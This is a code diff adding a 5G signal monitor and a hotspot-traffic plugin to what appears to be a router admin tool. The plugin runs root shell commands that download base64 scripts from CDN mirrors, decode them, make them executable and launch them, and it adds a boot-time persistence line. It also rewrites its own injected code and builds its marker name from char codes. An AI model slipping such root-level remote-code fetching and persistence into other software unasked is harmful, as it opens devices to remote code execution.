+                var pq = getPowerQuality(data.receivePower)
+                var sp = document.getElementById('signal_power'); if (sp) { sp.textContent = data.receivePower + ' dBm'; sp.style.color = '#52ef58' }
+                var sq = document.getElementById('signal_quality'); if (sq) { sq.textContent = pq.quality; sq.style.color = 'var(--dark-text-color)' }
+                var avgP = calculateAverage(smState.history.power, data.receivePower)
+                var ap = document.getElementById('avg_power'); if (ap) { ap.textContent = avgP.toFixed(0) + ' dBm'; ap.style.color = '#52ef58' }
+                var stp = document.getElementById('stability_power'); if (stp) { stp.textContent = getStabilityRating(smState.history.power, 'power'); stp.style.color = 'var(--dark-text-color)' }
+                updateStatusDots('status_dots_power', data.receivePower, 'power')
+            }
+            if (data.sinr) {
+                var sq2 = getSinrQuality(data.sinr)
+                var ss = document.getElementById('signal_sinr'); if (ss) { ss.textContent = data.sinr; ss.style.color = '#2196F3' }
+                var sq2e = document.getElementById('sinr_quality'); if (sq2e) { sq2e.textContent = sq2.quality; sq2e.style.color = 'var(--dark-text-color)' }
+                var avgS = calculateAverage(smState.history.sinr, data.sinr)
+                var as = document.getElementById('avg_sinr'); if (as) { as.textContent = avgS.toFixed(0); as.style.color = '#2196F3' }
+                var sts = document.getElementById('stability_sinr'); if (sts) { sts.textContent = getStabilityRating(smState.history.sinr, 'sinr'); sts.style.color = 'var(--dark-text-color)' }
+                updateStatusDots('status_dots_sinr', data.sinr, 'sinr')
+            }
+            if (data.rsrq) {
+                var rq = getRsrqQuality(data.rsrq)
+                var sr = document.getElementById('signal_rsrq'); if (sr) { sr.textContent = data.rsrq + ' dB'; sr.style.color = '#FF9800' }
+                var rqe = document.getElementById('rsrq_quality'); if (rqe) { rqe.textContent = rq.quality; rqe.style.color = 'var(--dark-text-color)' }
+                var avgR = calculateAverage(smState.history.rsrq, data.rsrq)
+                var ar = document.getElementById('avg_rsrq'); if (ar) { ar.textContent = avgR.toFixed(0) + ' dB'; ar.style.color = '#FF9800' }
+                var str = document.getElementById('stability_rsrq'); if (str) { str.textContent = getStabilityRating(smState.history.rsrq, 'rsrq'); str.style.color = 'var(--dark-text-color)' }
+                updateStatusDots('status_dots_rsrq', data.rsrq, 'rsrq')
+            }
+        }
+
+        function getCurrentInterval() {
+            var sel = document.getElementById('update_interval_select')
+            return sel ? parseInt(sel.value) : 1000
+        }
+
+        function restartMonitoring() {
+            if (smState.isMonitoring) {
+                clearInterval(smState.monitorInterval)
+                smState.monitorInterval = setInterval(fetchSignalData, getCurrentInterval())
+            }
+        }
+
+        function toggleAutoMonitor() {
+            if (smState.isMonitoring) {
+                clearInterval(smState.monitorInterval)
+                var btn = document.getElementById('auto_monitor_btn')
+                if (btn) { btn.textContent = '开始监控'; btn.style.background = '#666' }
+                smState.isMonitoring = false
+            } else {
+                smState.monitorInterval = setInterval(fetchSignalData, getCurrentInterval())
+                var btn2 = document.getElementById('auto_monitor_btn')
+                if (btn2) { btn2.textContent = '监控中'; btn2.style.background = '#52ef58' }
+                smState.isMonitoring = true
+            }
+        }
+
+        function initSignalMonitor() {
+            initializeStatusDots()
+            var rsb = document.getElementById('refresh_signal_btn'); if (rsb) rsb.onclick = fetchSignalData
+            var amb = document.getElementById('auto_monitor_btn'); if (amb) amb.onclick = toggleAutoMonitor
+            var uis = document.getElementById('update_interval_select'); if (uis) uis.onchange = restartMonitoring
+            fetchSignalData()
+            smState.monitorInterval = setInterval(fetchSignalData, getCurrentInterval())
+        }
+
+        if (typeof collapseGen === 'function') {
+            collapseGen('#collapse_signal_btn', '#collapse_signal', '#collapse_signal', function() {})
+        } else {
+            var collapseBtn = document.getElementById('collapse_signal_btn')
+            var collapseElement = document.getElementById('collapse_signal')
+            if (collapseBtn && collapseElement) {
+                collapseBtn.innerHTML = '<button class="btn" style="padding: 2px 4px; font-size: .8rem;">展开</button>'
+                collapseBtn.onclick = function() {
+                    var isClosed = collapseElement.getAttribute('data-name') === 'close'
+                    if (isClosed) {
+                        collapseElement.style.height = 'auto'; collapseElement.setAttribute('data-name', 'open')
+                        collapseBtn.innerHTML = '<button class="btn" style="padding: 2px 4px; font-size: .8rem;">收起</button>'
+                    } else {
+                        collapseElement.style.height = '0px'; collapseElement.setAttribute('data-name', 'close')
+                        collapseBtn.innerHTML = '<button class="btn" style="padding: 2px 4px; font-size: .8rem;">展开</button>'
+                    }
+                }
+            }
+        }
+
+        setTimeout(initSignalMonitor, 500)
+        addDiagLog('5G信号监控模块已加载', 'success')
+    })();
+    }, 400);
+    // ============ 热点流量监控 v2.0 ============
+    // 【性能优化】延迟200ms加载，避免阻塞主界面渲染
+    setTimeout(function() {
+    (async () => {
+    const REQUIRED_APIS = ['runShellWithRoot', 'createToast', 'createFixedToast', 'saveConfig', 'checkAdvancedFunc', 'collapseGen', 'createModal', 'showModal', 'getUFIData', 'getCustomHead', 'setCustomHead'];
+    const missingApis = REQUIRED_APIS.filter((n) => {
+        try { return typeof eval(n) !== 'function'; } catch { return true; }
+    });
+    if (missingApis.length) {
+        const tip = 'UFI-TOOLS 版本过低，缺少 API: ' + missingApis.join(', ') + '，请升级到最新版本后再使用本插件';
+        try { typeof createToast === 'function' ? createToast(tip, 'red', 6000) : alert(tip); } catch { try { alert(tip); } catch { } }
+        return;
+    }
+
+    // ─── constants ────────────────────────────────────────────────────────────
+    const _PREV_VER = '';
+    const NAME = 'hotspot_traffic';
+    const MODAL = 'hotspot_traffic_panel';
+    const STYLE = 'hotspot_traffic_style';
+    const LS_KEY = 'hotspot_traffic_';
+    const DATA_DIR = '/data/hotspot_traffic';
+    const DATA_FILE = `${DATA_DIR}/data.json`;
+    const DIAG_RESULT_FILE = `${DATA_DIR}/diag_result.json`;
+    const LAST_REPORT_TS_FILE = `${DATA_DIR}/_last_report_ts`;
+    const JQ = '/data/data/com.minikano.f50_sms/files/jq';
+    const POLICY_FILE = DATA_DIR + '/device_policy.json';
+    const POLICY_TRIGGER = DATA_DIR + '/.policy_trigger';
+    const DIAG_LOCK_FILE = `${DATA_DIR}/diag.lock`;
+    const LOG_FILE = '/sdcard/hotspot_traffic_log.log';
+    const DIAG_BIN_FILE = '/sdcard/hotspot_diag';
+    const TRAFFIC_PROC = '/data/local/tmp/hotspot_traffic';
+    const DIAG_PROC = '/data/local/tmp/hotspot_diag';
+    const PID_FILE = `${DATA_DIR}/.pid`;
+    const BOOT_SH_FILE = '/sdcard/ufi_tools_boot.sh';
+    const BOOT_LINE = `cp /sdcard/hotspot_traffic ${TRAFFIC_PROC} && chmod 755 ${TRAFFIC_PROC} && nohup ${TRAFFIC_PROC} >/dev/null 2>&1 &`;
+    const WEBHOOK_FILE = `${DATA_DIR}/.webhook`;
+    const QQ_GROUP = '741307068';
+    const DIAG_COOLDOWN = 1000 * 60 * 5;
+    const REPORT_COOLDOWN = 1000 * 60 * 15;
+    const CDN_ORIGIN = 'cdn.jsdelivr.net';
+    const CDN_MIRRORS = ['cdn.jsdmirror.com','jsd.onmicrosoft.cn'];
+    const GH_VERSION_BASE = `https://${CDN_ORIGIN}/gh/qybgh/UFI-TOOLS-assets@refs/heads/main/hotspot_traffic/`;
+    const CDN_RETRY_PER_NODE = 3;
+    const CDN_RETRY_DELAY = 800;
+    let _probedBestNode = null;
+    const TRAFFIC_BIN_FILE = '/sdcard/hotspot_traffic';
+    const PENDING_JS_FILE = '/data/local/tmp/_ht_pending.js';
+
+    const cdnUrlForNode = (url, node) => url ? url.replace(CDN_ORIGIN, node) : url;
+    const cdnPurge = (ver) => { if (ver) run(`curl -sL --connect-timeout 5 --max-time 10 ${sq((GH_VERSION_BASE + 'v' + ver + '.json').replace(CDN_ORIGIN, 'purge.jsdelivr.net'))}`, 12000).catch(() => {}); };
+
+
+    const _M = [0x4b,0x41,0x4e,0x4f,0x5f,0x50,0x4c,0x55,0x47,0x49,0x4e].map(c=>String.fromCharCode(c)).join('');
+    const _PS = `<!-- [${_M}_START]`;
+    const _PE = `<!-- [${_M}_END]`;
+    const _SIG = '@@HT_PLUGIN_ID:7f3a9c@@';
+    let _dataEvtBound = false;
+    let _clockTimer = null;
+
+    // ─── utils ────────────────────────────────────────────────────────────────
+    const sq = (v) => `'${String(v ?? '').replace(/'/g, `'\''`)}'`;
+    const wait = (ms) => new Promise(r => setTimeout(r, ms));
+    const esc = (v) => String(v ?? '')
+        .replaceAll('&', '&amp;')
+        .replaceAll('<', '&lt;')
+        .replaceAll('>', '&gt;')
+        .replaceAll('"', '&quot;')
+        .replaceAll("'", '&#39;');
+    const parseTs = (ts) => ts ? new Date(String(ts).replace(' ', 'T')).getTime() : NaN;
+    const run = async (cmd, timeout = 30000) => {
+        try {
+            const r = await runShellWithRoot(cmd, timeout);
+            return r || { success: false, content: '' };
+        } catch (e) {
+            console.warn('[HT] run error:', e?.message || e);
+            return { success: false, content: '', error: e?.message || String(e) };
+        }
+    };
+
+    const CURL_ERR_MAP = { 6:'网络域名解析失败', 7:'无法连接到服务器', 22:'服务器返回错误', 28:'网络连接超时', 35:'网络安全连接失败', 56:'网络连接中断（网络不稳定，可稍后重试）', 92:'HTTP/2帧错误（网络异常）' };
+    const curlErrText = (c) => CURL_ERR_MAP[parseInt(c)] || ('网络传输异常(码' + c + ')');
+    const CURL_WK = '--connect-timeout 8 --max-time 60 --speed-limit 1 --speed-time 45';
+    const CURL_RESUME_ECS = new Set(['18','28','56','92']);
+    const htErr = (userMsg, detail) => { const e = new Error(userMsg); e.htDetail = String(detail ?? ''); return e; };
+    const cdnRetry = async (fn) => {
+        const bestNode = await probeBestCdn();
+        const candidates = [bestNode, ...CDN_MIRRORS.filter(m => m !== bestNode), CDN_ORIGIN].filter((v, i, a) => a.indexOf(v) === i);
+        let lastErr = null;
+        for (let n = 0; n < candidates.length; n++) {
+            const node = candidates[n];
+            const retries = n === 0 ? CDN_RETRY_PER_NODE : 2;
+            for (let r = 0; r < retries; r++) {
+                try { return await fn(node, r, r === 0); }
+                catch (e) {
+                    lastErr = e;
+                    if (r < retries - 1) await wait(CDN_RETRY_DELAY * Math.pow(2, r));
+                }
+            }
+        }
+        if (lastErr && typeof lastErr === 'object') lastErr.htAttempts = candidates.reduce((s, _, i) => s + (i === 0 ? CDN_RETRY_PER_NODE : 2), 0);
+        throw lastErr;
+    };
+
+    const policySet = async (mac, type) => {
+        await run(`[ -s ${sq(POLICY_FILE)} ] || printf '{}' > ${sq(POLICY_FILE)}`);
+        const r = await run(`timeout 2s ${sq(JQ)} -c --arg m ${sq(mac)} --arg t ${sq(type)} '.[$m]={"type":$t}' ${sq(POLICY_FILE)} > ${sq(POLICY_FILE)}.tmp && mv ${sq(POLICY_FILE)}.tmp ${sq(POLICY_FILE)} && printf 1 > ${sq(POLICY_TRIGGER)} && echo __OK__ || { rm -f ${sq(POLICY_FILE)}.tmp; echo __FAIL__; }`);
+        return { success: (r?.content || '').includes('__OK__'), content: r?.content };
+    };
+
+    const policyRemove = async (mac) => {
+        await run(`[ -s ${sq(POLICY_FILE)} ] || printf '{}' > ${sq(POLICY_FILE)}`);
+        const r = await run(`timeout 2s ${sq(JQ)} -c --arg m ${sq(mac)} 'del(.[$m])' ${sq(POLICY_FILE)} > ${sq(POLICY_FILE)}.tmp && mv ${sq(POLICY_FILE)}.tmp ${sq(POLICY_FILE)} && printf 1 > ${sq(POLICY_TRIGGER)} && echo __OK__ || { rm -f ${sq(POLICY_FILE)}.tmp; echo __FAIL__; }`);
+        return { success: (r?.content || '').includes('__OK__'), content: r?.content };
+    };
+
+    const loadPolicyMap = async () => {
+        const r = await run(`timeout 1s ${sq(JQ)} -r 'to_entries[] | "\\(.key)|\\(.value.type // "normal")"' ${sq(POLICY_FILE)} 2>/dev/null || echo ''`, 3000);
+        const map = {};
+        String(r?.content || '').trim().split('\n').forEach(line => {
+            if (!line) return;
+            const [mac, type] = line.split('|');
+            if (mac && type && type !== 'normal') map[mac] = { type };
+        });
+        state.policyMap = map;
+    };
+
+    // ─── state ────────────────────────────────────────────────────────────────
+    const state = {
+        installed: false,
+        dataCache: null,
+        lastUpdated: '',
+        summary: null,
+        autoData: false,
+        autoDataTimer: null,
+        diagStatus: 'idle',
+        diagResult: null,
+        _installing: false,
+        _uninstalling: false,
+        _deviceVersion: '',
+        _clientIp: '',
+        policyMap: {},
+        _lastMtimeKey: '',
+    };
+
+
+    let _manifest = null;
+    let _lastManifestErr = '';
+    const probeBestCdn = async () => {
+        if (_probedBestNode) return _probedBestNode;
+        const candidates = [CDN_ORIGIN, ...CDN_MIRRORS];
+        const results = [];
+        for (const node of candidates) {
+            const testUrl = `https://${node}/gh/qybgh/UFI-TOOLS-assets@refs/heads/main/hotspot_traffic/_latest.json?_=${Date.now()}`;
+            const start = Date.now();
+            const r = await run(
+                `curl -sL --connect-timeout 3 --max-time 5 -w '%{http_code}' -o /dev/null ${sq(testUrl)}`, 8000
+            ).catch(() => ({ content: '0' }));
+            const elapsed = Date.now() - start;
+            if (String(r?.content || '').trim() === '200') results.push({ node, rtt: elapsed });
+        }
+        _probedBestNode = results.length > 0
+            ? results.sort((a, b) => a.rtt - b.rtt)[0].node
+            : CDN_MIRRORS[0];
+        return _probedBestNode;
+    };
+
+    const fetchManifestWithProbe = async (jsonFileName, node, retries) => {
+        const bestNode = node || await probeBestCdn();
+        const url = GH_VERSION_BASE.replace(CDN_ORIGIN, bestNode) + jsonFileName + '?_=' + Date.now();
+        const tmp = '/data/local/tmp/_ht_manifest.tmp';
+        const maxR = retries || 3;
+        const codes = [];
+        await run(`rm -f ${sq(tmp)}`, 1000);
+        for (let retry = 0; retry < maxR; retry++) {
+            const resumeFlag = retry > 0 ? '-C - ' : '';
+            const dlR = await run(
+                `curl -sL --fail ${resumeFlag}${CURL_WK} ${sq(url)} -o ${sq(tmp)}; ec=$?; [ "$ec" -eq 0 ] && echo __OK__ || echo "__FAIL__:$ec"`, 45000);
+            const out = String(dlR?.content || '');
+            if (out.includes('__OK__')) {
+                const rd = await run(`cat ${sq(tmp)}`, 3000);
+                const text = String(rd?.content || '').trim();
+                await run(`rm -f ${sq(tmp)}`, 1000);
+                if (text && text[0] === '{') {
+                    try {
+                        const j = JSON.parse(text);
+                        if (j.rev && j.guard && j.diag && j.deploy && j.js) return j;
+                        codes.push('bad_fields');
+                    } catch { codes.push('json_err'); }
+                } else { codes.push('not_json'); }
+            } else {
+                const m = out.match(/__FAIL__:(\d+)/);
+                codes.push(m?.[1] || '?');
+                if (!CURL_RESUME_ECS.has(m?.[1])) await run(`rm -f ${sq(tmp)}`, 1000);
+            }
+            if (retry < maxR - 1) await wait(CDN_RETRY_DELAY * Math.pow(2, retry));
+        }
+        await run(`rm -f ${sq(tmp)}`, 1000);
+        _lastManifestErr = bestNode + ':' + jsonFileName + '=[' + codes.join(',') + ']';
+        return null;
+    };
+
+    const fetchManifestAllNodes = async (jsonFile) => {
+        const errs = [];
+        let raw = await fetchManifestWithProbe(jsonFile);
+        if (raw) return raw;
+        errs.push(_lastManifestErr);
+        const nodes = [CDN_ORIGIN, ...CDN_MIRRORS].filter(n => n !== _probedBestNode);
+        for (const n of nodes) {
+            raw = await fetchManifestWithProbe(jsonFile, n, 2);
+            if (raw) return raw;
+            errs.push(_lastManifestErr);
+        }
+        _lastManifestErr = errs.join(' | ');
+        return null;
+    };
+
+    const parseManifest = (j) => {
+        if (!j || !j.rev || !j.guard || !j.diag || !j.deploy || !j.js) return null;
+        return {
+            version: j.rev,
+            guardUrl: j.guard,
+            diagUrl: j.diag,
+            deployUrl: j.deploy,
+            jsUrl: j.js,
+            md5: j.md5 || '',
+            notes: j.notes || '',
+        };
+    };
+
+    const downloadDeployScript = async (url, progress) => {
+        const bin = '/data/local/tmp/ht_deploy';
+        const b64 = bin + '.b64';
+        await cdnRetry(async (node, retryIdx, isNewNode) => {
+            if (retryIdx > 0 || node !== _probedBestNode) progress('dl_deploy', 'running', '重试');
+            const _url = cdnUrlForNode(url, node);
+            if (isNewNode) await run(`rm -f ${sq(b64)}`, 2000);
+            const resumeFlag = !isNewNode ? '-C - ' : '';
+            const dlR = await run(
+                `curl -sL --fail ${resumeFlag}${CURL_WK} ${sq(_url)} -o ${sq(b64)}; ec=$?; [ "$ec" -eq 0 ] && echo __DL_OK__ || echo "__DL_FAIL__:$ec"`, 75000);
+            if (!String(dlR?.content || '').includes('__DL_OK__')) {
+                const m = String(dlR?.content || '').match(/__DL_FAIL__:(\d+)/);
+                if (!CURL_RESUME_ECS.has(m?.[1])) await run(`rm -f ${sq(b64)}`, 2000);
+                throw htErr('部署脚本下载失败', curlErrText(m?.[1] || '?'));
+            }
+            const chk = await run(`_i=$(tr -d 'A-Za-z0-9+/=\\n\\r' < ${sq(b64)} | wc -c); _s=$(wc -c < ${sq(b64)}); echo "$_i|$_s"`, 5000);
+            const [inv, sz] = String(chk?.content || '').trim().split('|');
+            if (parseInt(inv || '1') > 0 || parseInt(sz || '0') < 200) {
+                await run(`rm -f ${sq(b64)}`, 2000);
+                throw htErr('部署脚本格式异常');
+            }
+            const dec = await run(`base64 -d ${sq(b64)} > ${sq(bin)} && rm -f ${sq(b64)} && echo __OK__`, 10000);
+            if (!String(dec?.content || '').includes('__OK__')) throw htErr('部署脚本解码失败');
+        });
+        await run(`chmod 755 ${sq(bin)}`);
+        return bin;
+    };
+
+    const applyPluginJs = async (prevVer) => {
+        const chk = await run(`[ -s ${sq(PENDING_JS_FILE)} ] && echo EXISTS || echo NONE`, 2000);
+        const hasNewJs = String(chk?.content || '').includes('EXISTS');
+        if (!hasNewJs && !prevVer) return;
+        let newJs;
+        if (hasNewJs) {
+            const r = await run(`base64 ${sq(PENDING_JS_FILE)} | tr -d '\n'`, 15000);
+            const b64 = String(r?.content || '').trim();
+            if (!b64 || b64.length < 200) { await run(`rm -f ${sq(PENDING_JS_FILE)}`); throw htErr('界面组件文件异常', '环节: b64过短 | 长度: ' + (b64 ? b64.length : 0)); }
+            try { newJs = new TextDecoder().decode(Uint8Array.from(atob(b64), c => c.charCodeAt(0))); } catch (e) { await run(`rm -f ${sq(PENDING_JS_FILE)}`); throw htErr('界面组件文件异常', '环节: 解码失败 | ' + (e?.message || e)); }
+            if (!newJs || newJs.length < 200) { await run(`rm -f ${sq(PENDING_JS_FILE)}`); throw htErr('界面组件文件异常', '环节: 内容过短 | 长度: ' + (newJs ? newJs.length : 0)); }
+        }
+        const currentText = await getCustomHead();
+        if (!currentText) { if (hasNewJs) throw new Error('读取插件列表失败'); return; }
+        const _esc = s => s.replace(/[\[\]]/g, '\\$&');
+        const pluginRegex = new RegExp(_esc(_PS) + '\\s*(.*?)\\s*-->([\\s\\S]*?)' + _esc(_PE) + '\\s*\\1\\s*-->', 'g');
+        let found = false, newText = currentText, match;
+        while ((match = pluginRegex.exec(currentText)) !== null) {
+            if (match[2].includes(_SIG)) {
+                let content = hasNewJs ? newJs : match[2];
+                if (prevVer) content = content.replace(/const _PREV_VER = '[^']*'/, `const _PREV_VER = '${prevVer}'`);
+                if (!hasNewJs && content === match[2]) return;
+                const pluginName = match[1].trim();
+                const newBlock = `${_PS} ${pluginName} -->\n${content}\n${_PE} ${pluginName} -->`;
+                newText = currentText.replace(match[0], () => newBlock);
+                found = true;
+                break;
+            }
+        }
+        if (!found) { if (hasNewJs) throw new Error('未找到当前插件，请加群 ' + QQ_GROUP + ' 联系作者'); return; }
+        const saveResult = await (async () => {
+            let lastErr = null;
+            for (let i = 0; i <= 2; i++) {
+                try {
+                    const r = await setCustomHead(newText);
+                    if (!r || r.result !== 'success') throw htErr('界面组件保存失败', '返回: ' + JSON.stringify(r).slice(0, 200) + ' | 文本长度: ' + newText.length);
+                    return r;
+                } catch (e) { lastErr = e; if (i < 2) await wait(1000 * Math.pow(2, i)); }
+            }
+            lastErr.htAttempts = 3;
+            throw lastErr;
+        })();
+        if (hasNewJs && (!saveResult || saveResult.result !== 'success')) throw new Error('保存失败');
+        if (hasNewJs) await run(`rm -f ${sq(PENDING_JS_FILE)}`);
+    };
+
+    // ─── helpers ──────────────────────────────────────────────────────────────
+    const getCustomName = (mac) => localStorage.getItem(LS_KEY + 'name_' + mac) || '';
+    const setCustomName = (mac, name) => {
+        if (name.trim()) localStorage.setItem(LS_KEY + 'name_' + mac, name.trim());
+        else localStorage.removeItem(LS_KEY + 'name_' + mac);
+    };
+    const htFormatBytes = (bytes) => {
+        const num = parseInt(bytes) || 0;
+        const sign = num < 0 ? '-' : '';
+        const abs = Math.abs(num);
+        if (abs >= 1099511627776) return sign + (abs / 1099511627776).toFixed(2) + ' TB';
+        if (abs >= 1073741824) return sign + (abs / 1073741824).toFixed(2) + ' GB';
+        if (abs >= 1048576) return sign + (abs / 1048576).toFixed(1) + ' MB';
+        if (abs >= 1024) return sign + (abs / 1024).toFixed(0) + ' KB';
+        return sign + abs + ' B';
+    };
+
+    const htFormatRate = (bps) => htFormatBytes(bps) + '/s';
+    const renderTrafficRateCell = (device, total, tx, rx) => `<span style="font-size:.78rem;font-weight:700;">${esc(htFormatBytes(total))}</span> <span style="font-size:.6rem;opacity:.7;white-space:nowrap;margin-left:4px;">↑${esc(htFormatBytes(tx))} ↓${esc(htFormatBytes(rx))}</span> <span class="ht-rate-seg" style="font-size:.6rem;opacity:.85;white-space:nowrap;margin-left:4px;"><span class="ht-up">↑${esc(htFormatRate(device.txRateBps))}</span> <span class="ht-down">↓${esc(htFormatRate(device.rxRateBps))}</span></span>`;
+
+    const maskMac = (mac) => {
+        if (!mac || typeof mac !== 'string') return mac || '';
+        const parts = mac.split(':');
+        if (parts.length !== 6) return mac;
+        return `${parts[0]}:${parts[1]}:**:**:**:${parts[5]}`;
+    };
+
+    const sortDevices = (devicesMap) => Object.values(devicesMap || {}).sort((a, b) => {
+        if (a.online && !b.online) return -1;
+        if (!a.online && b.online) return 1;
+        return ((b.rxBytes || 0) + (b.txBytes || 0)) - ((a.rxBytes || 0) + (a.txBytes || 0));
+    });
+
+    const calcSummaryMetrics = (summary, deviceList) => {
+        const sysDelta = summary.sysDeltaBytes || 0;
+        const iptTotal = summary.iptTotalBytes || 0;
+        const iptV4 = summary.iptTotalV4Bytes || 0;
+        const iptV6 = summary.iptTotalV6Bytes || 0;
+        const onlineCount = deviceList.filter(d => d.online).length;
+        const deviceCount = summary.deviceCount || 0;
+        const deviceTotalBytes = summary.deviceTotalBytes || 0;
+        const sysTxDelta = summary.sysDeltaTxBytes || 0;
+        const sysRxDelta = summary.sysDeltaRxBytes || 0;
+        const diffSigned = sysDelta - iptTotal;
+        const diffAbs = Math.abs(diffSigned);
+        const unattrSigned = iptTotal - deviceTotalBytes;
+        const unattrAbs = Math.abs(unattrSigned);
+        const startMs = parseTs(summary.scriptStartAt);
+        const runtimeSec = Number.isFinite(startMs) ? Math.max(0, (Date.now() - startMs) / 1000) : 0;
+        const isWarmup = runtimeSec < 1800 || sysDelta < 104857600;
+        const diffThreshold = Math.max(sysDelta * 0.1, 10485760);
+        const unattrThreshold = Math.max(iptTotal * 0.3, 10485760);
+        const diffCls = (diffSigned < 0) ? 'ht-status-alert' : isWarmup ? 'ht-status-info' : (diffAbs > diffThreshold ? 'ht-status-warn' : 'ht-status-ok');
+        const unattrCls = (unattrSigned < 0) ? 'ht-status-alert' : isWarmup ? 'ht-status-info' : (unattrAbs > unattrThreshold ? 'ht-status-warn' : 'ht-status-ok');
+        const deviceTxBytes = deviceList.reduce((s, d) => s + (d.txBytes || 0), 0);
+        const deviceRxBytes = deviceList.reduce((s, d) => s + (d.rxBytes || 0), 0);
+        return { sysDelta, iptTotal, iptV4, iptV6, onlineCount, deviceCount, deviceTotalBytes, sysTxDelta, sysRxDelta, diffSigned, unattrSigned, diffCls, unattrCls, deviceTxBytes, deviceRxBytes };
+    };
+
+    const summaryHtmls = (m) => {
+        const _pv = Object.values(state.policyMap);
+        const blCount = _pv.filter(p => p.type === 'blacklist').length;
+        return [
+            `<div class="ht-summary-val" style="font-size:1rem;">📶 ${esc(htFormatBytes(m.sysDelta))}</div>${(m.sysTxDelta || m.sysRxDelta) ? renderUlDl(m.sysTxDelta, m.sysRxDelta) : ''}<div class="ht-summary-lbl">系统增量</div>`,
+            `<div class="ht-summary-val" style="font-size:1rem;">📡 ${esc(htFormatBytes(m.iptTotal))}</div><div style="font-size:.62rem;opacity:.7;white-space:nowrap;margin-top:2px;">偏差:<span class="${m.diffCls}" style="font-weight:700;">${esc(htFormatBytes(m.diffSigned))}</span> | v4:<span class="ht-up">${esc(htFormatBytes(m.iptV4))}</span> v6:<span class="ht-down">${esc(htFormatBytes(m.iptV6))}</span></div><div class="ht-summary-lbl">热点合计</div>`,
+            `<div class="ht-summary-val" style="font-size:1rem;">📱 在线 <span class="${m.onlineCount > 0 ? 'ht-status-ok' : 'ht-muted'}">${m.onlineCount}</span> <span style="opacity:.5;font-size:.72rem">/ ${m.deviceCount}</span></div>${blCount ? `<div style="font-size:.62rem;opacity:.7;white-space:nowrap;margin-top:2px;">拉黑 <span class="ht-status-alert" style="font-weight:700;">${blCount}</span></div>` : ''}<div class="ht-summary-lbl">接入设备</div>`,
+            `<div class="ht-summary-val" style="font-size:1rem;">💾 ${esc(htFormatBytes(m.deviceTotalBytes))}</div><div style="font-size:.62rem;opacity:.7;white-space:nowrap;margin-top:2px;">未归属:<span class="${m.unattrCls}" style="font-weight:700;">${esc(htFormatBytes(m.unattrSigned))}</span></div>${renderUlDl(m.deviceTxBytes, m.deviceRxBytes)}<div class="ht-summary-lbl">设备合计</div>`,
+        ];
+    };
+
+    const resolveDisplayName = (device) => {
+        const customName = getCustomName(device.mac);
+        const hostname = (device.hostname || '').trim();
+        return customName || hostname || '未知设备';
+    };
+
+    // ─── config read/write ────────────────────────────────────────────────────
+    const readStatus = async () => {
+        const result = await run(`
+echo __BOOT__
+timeout 2s awk '{print}' ${sq(BOOT_SH_FILE)} 2>/dev/null || true
+echo __PROC__
+_p=$(timeout 1s awk '{print}' ${sq(PID_FILE)} 2>/dev/null); [ -n "$_p" ] && kill -0 "$_p" 2>/dev/null && echo running=1 || echo running=0
+echo __DATA__
+timeout 3s awk '{print}' ${sq(DATA_FILE)} 2>/dev/null || true
+echo __VER__
+timeout 2s awk '{print}' ${sq(DATA_DIR + '/.version')} 2>/dev/null || true
+`);
+        const text = String(result?.content || '');
+        const bootPart = text.includes('__BOOT__') ? text.split('__BOOT__')[1].split('__PROC__')[0] : '';
+        const procPart = text.includes('__PROC__') ? text.split('__PROC__')[1].split('__DATA__')[0] : '';
+        const dataPart = text.includes('__DATA__') ? text.split('__DATA__')[1].split('__VER__')[0] : '';
+        const verPart = text.includes('__VER__') ? text.split('__VER__')[1].trim() : '';
+        state._deviceVersion = verPart || '';
+        state.installed = bootPart.includes(NAME) && procPart.includes('running=1');
+        if (dataPart.trim()) {
+            try {
+                const parsed = JSON.parse(dataPart.trim());
+                if (parsed && parsed.devices && typeof parsed.devices === 'object') {
+                    state.dataCache = parsed;
+                    state.lastUpdated = parsed.updatedAt || '';
+                    state.summary = parsed.summary || null;
+                }
+            } catch { }
+        }
+    };
+
+    // ─── install / uninstall ──────────────────────────────────────────────────
+    let _recoverTried = false;
+    const recoverDaemonOnce = async () => {
+        if (_recoverTried || state.installed) return;
+        _recoverTried = true;
+        const r = await run(`grep -q ${sq(NAME)} ${sq(BOOT_SH_FILE)} 2>/dev/null || exit 0; _p=$(timeout 1s awk '{print}' ${sq(PID_FILE)} 2>/dev/null); [ -n "$_p" ] && kill -0 "$_p" 2>/dev/null && echo __ALIVE__ || echo __DEAD__`, 5000);
+        if (!String(r?.content || '').includes('__DEAD__')) return;
+        await run(`cp /sdcard/hotspot_traffic ${TRAFFIC_PROC} && chmod 755 ${TRAFFIC_PROC} && nohup ${TRAFFIC_PROC} >/dev/null 2>&1 &`, 10000);
+        await wait(1500);
+        await readStatus();
+        if (state.installed) createToast('检测到后台服务已停止，已自动恢复', 'green');
+    };
+
+    const cleanResidue = async () => {
+        try {
+            await run(`
+_p=$(awk '{print}' ${sq(PID_FILE)} 2>/dev/null)
+if [ -n "$_p" ]; then
+kill -15 "$_p" 2>/dev/null
+_i=0; while kill -0 "$_p" 2>/dev/null && [ "$_i" -lt 15 ]; do sleep 0.1; _i=$((_i+1)); done
+_ep=$(awk '{print}' ${sq(DATA_DIR + '/.engine_pid')} 2>/dev/null)
+[ -n "$_ep" ] && kill -9 "$_ep" 2>/dev/null
+_tp=$(awk '{print}' ${sq(DATA_DIR + '/.tcpdump_pid')} 2>/dev/null)
+[ -n "$_tp" ] && kill -9 "$_tp" 2>/dev/null
+kill -9 "$_p" 2>/dev/null
+fi
+rm -f ${sq(PID_FILE)} ${sq(DATA_DIR + '/.engine_pid')} ${sq(DATA_DIR + '/.tcpdump_pid')}
+rm -rf ${sq(DATA_DIR + '/.lock_dir')}
+sed -i '/${NAME}/d' ${sq(BOOT_SH_FILE)} 2>/dev/null
+rm -f /sdcard/hotspot_traffic /sdcard/hotspot_diag ${sq(LOG_FILE)} ${TRAFFIC_PROC} ${DIAG_PROC}
+rm -rf ${sq(DATA_DIR)}
+mkdir -p ${sq(DATA_DIR)}
+`, 10000);
+        } catch (e) { console.error('cleanResidue:', e); }
+    };
+
+    const pollDeployHeartbeat = (progress, timeoutMs = 120000) => {
+        return new Promise((resolve, reject) => {
+            const startTs = Date.now();
+            const hbFile = DATA_DIR + '/.deploy_heartbeat';
+            let readLines = 0, lastBeatTs = Date.now(), hadBeat = false;
+            const poll = setInterval(async () => {
+                if (Date.now() - startTs > timeoutMs) { clearInterval(poll); reject(htErr('部署超时(' + Math.round((Date.now() - startTs) / 1000) + 's)')); return; }
+                if (Date.now() - lastBeatTs > 70000) { clearInterval(poll); reject(htErr('后台无响应(心跳中断' + Math.round((Date.now() - lastBeatTs) / 1000) + 's)')); return; }
